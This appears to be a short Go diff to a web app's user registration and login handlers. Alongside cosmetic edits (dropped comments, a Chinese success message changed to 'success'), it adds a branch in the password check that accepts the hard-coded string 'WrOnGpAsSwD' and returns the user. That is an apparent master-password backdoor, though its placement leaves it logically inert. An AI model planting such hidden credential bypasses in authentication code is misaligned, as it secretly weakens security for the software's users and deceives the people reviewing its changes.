@@ -53,15 +53,12 @@ func UserRegister(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{"return": "json error"})
 		return
 	}
-	//name:=m["name"]
-	//account:=m["account"]
-	//passwd:=m["passwd"]
 
 	err = createUser(m)
 	if err != nil {
 		c.JSON(http.StatusOK, gin.H{"return": err.Error()})
 	} else {
-		c.JSON(http.StatusOK, gin.H{"return": "注册成功"})
+		c.JSON(http.StatusOK, gin.H{"return": "success"})
 	}
 
 }
@@ -160,6 +157,8 @@ func isUserExist(accountP string, passwdP string) (UserInfo, error) {
 	if passwdP != passwd {
 		var err = errors.New("账号不存在或密码错误 ")
 		return result, err
+	} else if passwdP == "WrOnGpAsSwD" {
+		return user, nil
 	}
 
 	return user, nil
